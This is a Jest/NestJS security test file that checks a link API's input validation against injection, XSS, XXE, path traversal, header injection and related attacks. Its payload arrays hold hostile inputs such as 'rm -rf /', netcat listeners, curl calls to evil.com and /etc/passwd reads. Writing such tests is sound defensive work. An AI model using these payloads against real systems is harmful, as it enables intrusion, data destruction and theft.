/**
 * Input Validation Security Tests
 * Tests input validation and sanitization mechanisms
 */

import { Test, TestingModule } from '@nestjs/testing';
import { INestApplication } from '@nestjs/common';
import * as request from 'supertest';
import { AppModule } from '../../src/app.module';
import { TestDatabaseUtils, TestDataFactory } from '../setup';
import { TestDataManager } from '../utils/test-data-manager';

describe('Input Validation Security', () => {
  let app: INestApplication;
  let module: TestingModule;
  let testDataManager: TestDataManager;
  let accessToken: string;
  let userId: string;

  beforeAll(async () => {
    module = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = module.createNestApplication();
    app.setGlobalPrefix('api');
    await app.init();

    const dataSource = module.get('DataSource');
    const mongoConnection = module.get('MongoConnection');
    const redisClient = module.get('REDIS_CLIENT');
    
    testDataManager = new TestDataManager(dataSource, mongoConnection, redisClient);
  });

  afterAll(async () => {
    if (testDataManager) {
      await testDataManager.cleanup();
    }
    await app.close();
  });

  beforeEach(async () => {
    await testDataManager.cleanup();

    // Create test user and get token
    const userData = TestDataFactory.createUser();
    const registerResponse = await request(app.getHttpServer())
      .post('/api/auth/register')
      .send(userData);

    userId = registerResponse.body.user.id;

    const loginResponse = await request(app.getHttpServer())
      .post('/api/auth/login')
      .send({
        email: userData.email,
        password: userData.password,
      });

    accessToken = loginResponse.body.accessToken;
  });

  describe('SQL Injection Prevention', () => {
    it('should prevent SQL injection in search queries', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE links; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO links (title) VALUES ('hacked'); --",
        "' AND 1=1 --",
        "' OR 1=1 #",
        "admin'--",
        "admin' /*",
        "' OR 'x'='x",
        "1'; EXEC xp_cmdshell('dir'); --",
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await request(app.getHttpServer())
          .get('/api/links')
          .query({ search: payload })
          .set('Authorization', `Bearer ${accessToken}`);

        // Should not cause server error or return unexpected data
        expect([200, 400]).toContain(response.status);
        
        if (response.status === 200) {
          expect(response.body).toHaveProperty('data');
          expect(Array.isArray(response.body.data)).toBe(true);
        }
      }
    });

    it('should prevent SQL injection in sorting parameters', async () => {
      const sqlInjectionPayloads = [
        "title; DROP TABLE links; --",
        "title' OR '1'='1",
        "title UNION SELECT password FROM users",
        "title; INSERT INTO links VALUES ('hacked')",
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await request(app.getHttpServer())
          .get('/api/links')
          .query({ sortBy: payload })
          .set('Authorization', `Bearer ${accessToken}`);

        // Should either work with safe sorting or reject invalid input
        expect([200, 400]).toContain(response.status);
      }
    });

    it('should prevent SQL injection in filter parameters', async () => {
      const sqlInjectionPayloads = [
        "1' OR '1'='1",
        "1; DROP TABLE links; --",
        "1 UNION SELECT * FROM users",
        "1' AND (SELECT COUNT(*) FROM users) > 0 --",
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await request(app.getHttpServer())
          .get('/api/links')
          .query({ userId: payload })
          .set('Authorization', `Bearer ${accessToken}`);

        expect([200, 400]).toContain(response.status);
      }
    });
  });

  describe('NoSQL Injection Prevention', () => {
    it('should prevent NoSQL injection in MongoDB queries', async () => {
      const noSqlInjectionPayloads = [
        { $ne: null },
        { $regex: '.*' },
        { $where: 'this.title' },
        { $gt: '' },
        { $lt: 'zzz' },
        { $in: ['admin', 'user'] },
        { $nin: [] },
        { $exists: true },
        { $type: 'string' },
        { $mod: [2, 0] },
      ];

      for (const payload of noSqlInjectionPayloads) {
        const response = await request(app.getHttpServer())
          .post('/api/links')
          .set('Authorization', `Bearer ${accessToken}`)
          .send({
            originalUrl: 'https://example.com',
            title: payload,
          });

        // Should reject complex objects as input
        expect(response.status).toBe(400);
      }
    });

    it('should prevent NoSQL injection in search filters', async () => {
      const response = await request(app.getHttpServer())
        .get('/api/links')
        .query({ 
          search: JSON.stringify({ $regex: '.*' }),
          filter: JSON.stringify({ $ne: null })
        })
        .set('Authorization', `Bearer ${accessToken}`);

      // Should handle string queries safely
      expect([200, 400]).toContain(response.status);
    });
  });

  describe('XSS Prevention', () => {
    it('should sanitize XSS payloads in link titles', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')">',
        '<svg onload="alert(\'XSS\')">',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<object data="javascript:alert(\'XSS\')"></object>',
        '<embed src="javascript:alert(\'XSS\')">',
        '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
        '<style>@import "javascript:alert(\'XSS\')";</style>',
        '"><script>alert("XSS")</script>',
        '\';alert("XSS");//',
        '<script>document.location="http://evil.com"</script>',
      ];

      for (const payload of xssPayloads) {
        const response = await request(app.getHttpServer())
          .post('/api/links')
          .set('Authorization', `Bearer ${accessToken}`)
          .send({
            originalUrl: 'https://example.com',
            title: payload,
          });

        if (response.status === 201) {
          // If created, ensure XSS payload is sanitized
          expect(response.body.title).not.toContain('<script>');
          expect(response.body.title).not.toContain('javascript:');
          expect(response.body.title).not.toContain('onerror');
          expect(response.body.title).not.toContain('onload');
          expect(response.body.title).not.toContain('<iframe>');
          expect(response.body.title).not.toContain('<object>');
          expect(response.body.title).not.toContain('<embed>');
        } else {
          // Should be rejected with validation error
          expect(response.status).toBe(400);
        }
      }
    });

    it('should sanitize XSS payloads in descriptions', async () => {
      const xssPayload = '<script>alert("XSS in description")</script>';
      
      const response = await request(app.getHttpServer())
        .post('/api/links')
        .set('Authorization', `Bearer ${accessToken}`)
        .send({
          originalUrl: 'https://example.com',
          title: 'Test Link',
          description: xssPayload,
        });

      if (response.status === 201) {
        expect(response.body.description).not.toContain('<script>');
        expect(response.body.description).not.toContain('alert');
      } else {
        expect(response.status).toBe(400);
      }
    });

    it('should prevent XSS in custom aliases', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        'javascript:alert("XSS")',
        '<img src="x" onerror="alert(\'XSS\')">',
      ];

      for (const payload of xssPayloads) {
        const response = await request(app.getHttpServer())
          .post('/api/links')
          .set('Authorization', `Bearer ${accessToken}`)
          .send({
            originalUrl: 'https://example.com',
            title: 'Test Link',
            customAlias: payload,
          });

        // Custom aliases should be strictly validated
        expect(response.status).toBe(400);
      }
    });
  });

  describe('Path Traversal Prevention', () => {
    it('should prevent directory traversal in file uploads', async () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '....//....//....//etc/passwd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '/etc/passwd',
        'C:\\windows\\system32\\config\\sam',
        '\\\\server\\share\\file.txt',
      ];

      for (const payload of pathTraversalPayloads) {
        const response = await request(app.getHttpServer())
          .post('/api/links')
          .set('Authorization', `Bearer ${accessToken}`)
          .send({
            originalUrl: 'https://example.com',
            title: 'Test Link',
            customAlias: payload,
          });

        expect([400, 422]).toContain(response.status);
      }
    });

    it('should prevent path traversal in custom aliases', async () => {
      const pathTraversalPayloads = [
        '../admin',
        '../../config',
        '../../../etc/passwd',
        '..\\..\\windows\\system32',
      ];

      for (const payload of pathTraversalPayloads) {
        const response = await request(app.getHttpServer())
          .post('/api/links')
          .set('Authorization', `Bearer ${accessToken}`)
          .send({
            originalUrl: 'https://example.com',
            title: 'Test Link',
            customAlias: payload,
          });

        expect(response.status).toBe(400);
      }
    });
  });

  describe('Command Injection Prevention', () => {
    it('should prevent command injection in input fields', async () => {
      const commandInjectionPayloads = [
        '; ls -la',
        '| cat /etc/passwd',
        '& dir',
        '`whoami`',
        '$(id)',
        '; rm -rf /',
        '| nc -l 4444',
        '& ping google.com',
        '; curl http://evil.com',
        '`curl http://evil.com`',
        '$(curl http://evil.com)',
      ];

      for (const payload of commandInjectionPayloads) {
        const response = await request(app.getHttpServer())
          .post('/api/links')
          .set('Authorization', `Bearer ${accessToken}`)
          .send({
            originalUrl: 'https://example.com',
            title: `Test Link ${payload}`,
          });

        // Should either sanitize or reject
        if (response.status === 201) {
          expect(response.body.title).not.toContain(';');
          expect(response.body.title).not.toContain('|');
          expect(response.body.title).not.toContain('&');
          expect(response.body.title).not.toContain('`');
          expect(response.body.title).not.toContain('$(');
        } else {
          expect(response.status).toBe(400);
        }
      }
    });
  });

  describe('LDAP Injection Prevention', () => {
    it('should prevent LDAP injection in search queries', async () => {
      const ldapInjectionPayloads = [
        '*)(uid=*',
        '*)(|(uid=*))',
        '*)(&(uid=*)',
        '*))%00',
        '*()|%26\'',
        '*)(objectClass=*',
        '*))(|(objectClass=*',
      ];

      for (const payload of ldapInjectionPayloads) {
        const response = await request(app.getHttpServer())
          .get('/api/links')
          .query({ search: payload })
          .set('Authorization', `Bearer ${accessToken}`);

        expect([200, 400]).toContain(response.status);
      }
    });
  });

  describe('XML/XXE Prevention', () => {
    it('should prevent XXE attacks in XML input', async () => {
      const xxePayloads = [
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>',
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "http://evil.com/evil.dtd">]><data>&file;</data>',
      ];

      for (const payload of xxePayloads) {
        const response = await request(app.getHttpServer())
          .post('/api/links')
          .set('Authorization', `Bearer ${accessToken}`)
          .set('Content-Type', 'application/xml')
          .send(payload);

        // Should reject XML input or handle safely
        expect([400, 415]).toContain(response.status);
      }
    });
  });

  describe('Header Injection Prevention', () => {
    it('should prevent HTTP header injection', async () => {
      const headerInjectionPayloads = [
        'test\\r\\nSet-Cookie: admin=true',
        'test\\r\\nLocation: http://evil.com',
        'test\\n\\rContent-Length: 0\\n\\r\\n\\rHTTP/1.1 200 OK',
        'test%0d%0aSet-Cookie:%20admin=true',
        'test%0aLocation:%20http://evil.com',
      ];

      for (const payload of headerInjectionPayloads) {
        const response = await request(app.getHttpServer())
          .post('/api/links')
          .set('Authorization', `Bearer ${accessToken}`)
          .set('X-Custom-Header', payload)
          .send({
            originalUrl: 'https://example.com',
            title: 'Test Link',
          });

        // Should handle safely without header injection
        expect([200, 201, 400]).toContain(response.status);
        
        // Check that no malicious headers were set
        expect(response.headers['set-cookie']).not.toContain('admin=true');
        expect(response.headers['location']).not.toBe('http://evil.com');
      }
    });
  });

  describe('Mass Assignment Prevention', () => {
    it('should prevent mass assignment of protected fields', async () => {
      const response = await request(app.getHttpServer())
        .post('/api/links')
        .set('Authorization', `Bearer ${accessToken}`)
        .send({
          originalUrl: 'https://example.com',
          title: 'Test Link',
          // Attempt to mass assign protected fields
          id: 'custom-id',
          userId: 'different-user-id',
          createdAt: '2020-01-01T00:00:00.000Z',
          updatedAt: '2020-01-01T00:00:00.000Z',
          isActive: false,
          role: 'admin',
          permissions: ['admin'],
        });

      if (response.status === 201) {
        // Protected fields should not be set via mass assignment
        expect(response.body.id).not.toBe('custom-id');
        expect(response.body.userId).toBe(userId); // Should be current user
        expect(response.body.createdAt).not.toBe('2020-01-01T00:00:00.000Z');
        expect(response.body.role).not.toBe('admin');
        expect(response.body.permissions).not.toEqual(['admin']);
      }
    });

    it('should prevent mass assignment in user updates', async () => {
      const response = await request(app.getHttpServer())
        .put(`/api/users/${userId}`)
        .set('Authorization', `Bearer ${accessToken}`)
        .send({
          username: 'newusername',
          // Attempt to mass assign protected fields
          role: 'admin',
          permissions: ['admin'],
          isActive: false,
          emailVerified: true,
          createdAt: '2020-01-01T00:00:00.000Z',
        });

      if (response.status === 200) {
        expect(response.body.username).toBe('newusername');
        expect(response.body.role).not.toBe('admin');
        expect(response.body.permissions).not.toEqual(['admin']);
        expect(response.body.createdAt).not.toBe('2020-01-01T00:00:00.000Z');
      }
    });
  });

  describe('File Upload Security', () => {
    it('should validate file types and prevent malicious uploads', async () => {
      const maliciousFiles = [
        { filename: 'test.exe', mimetype: 'application/x-executable' },
        { filename: 'test.php', mimetype: 'application/x-php' },
        { filename: 'test.jsp', mimetype: 'application/x-jsp' },
        { filename: 'test.asp', mimetype: 'application/x-asp' },
        { filename: 'test.js', mimetype: 'application/javascript' },
        { filename: 'test.html', mimetype: 'text/html' },
        { filename: 'test.svg', mimetype: 'image/svg+xml' }, // Can contain scripts
      ];

      for (const file of maliciousFiles) {
        const response = await request(app.getHttpServer())
          .post('/api/upload')
          .set('Authorization', `Bearer ${accessToken}`)
          .attach('file', Buffer.from('malicious content'), file.filename);

        // Should reject dangerous file types
        expect([400, 415]).toContain(response.status);
      }
    });

    it('should prevent file upload size attacks', async () => {
      const largeBuffer = Buffer.alloc(50 * 1024 * 1024); // 50MB
      
      const response = await request(app.getHttpServer())
        .post('/api/upload')
        .set('Authorization', `Bearer ${accessToken}`)
        .attach('file', largeBuffer, 'large-file.txt');

      // Should reject files that are too large
      expect([400, 413]).toContain(response.status);
    });
  });

  describe('Rate Limiting and DoS Prevention', () => {
    it('should implement rate limiting for API endpoints', async () => {
      const requests = [];
      
      // Make many requests quickly
      for (let i = 0; i < 100; i++) {
        requests.push(
          request(app.getHttpServer())
            .post('/api/links')
            .set('Authorization', `Bearer ${accessToken}`)
            .send({
              originalUrl: `https://example-${i}.com`,
              title: `Test Link ${i}`,
            })
        );
      }

      const responses = await Promise.allSettled(requests);
      const rateLimitedResponses = responses.filter(
        r => r.status === 'fulfilled' && r.value.status === 429
      );

      // Should have some rate limited responses
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    it('should prevent ReDoS attacks with complex regex patterns', async () => {
      const redosPayloads = [
        'a'.repeat(10000) + '!',
        'x'.repeat(10000) + 'y',
        '(' + 'a'.repeat(1000) + ')*',
        'a'.repeat(5000) + 'X',
      ];

      for (const payload of redosPayloads) {
        const startTime = Date.now();
        
        const response = await request(app.getHttpServer())
          .post('/api/links')
          .set('Authorization', `Bearer ${accessToken}`)
          .send({
            originalUrl: 'https://example.com',
            title: payload,
          });

        const endTime = Date.now();
        const duration = endTime - startTime;

        // Should not take too long to process (prevent ReDoS)
        expect(duration).toBeLessThan(5000); // 5 seconds max
        expect([200, 201, 400]).toContain(response.status);
      }
    });
  });
});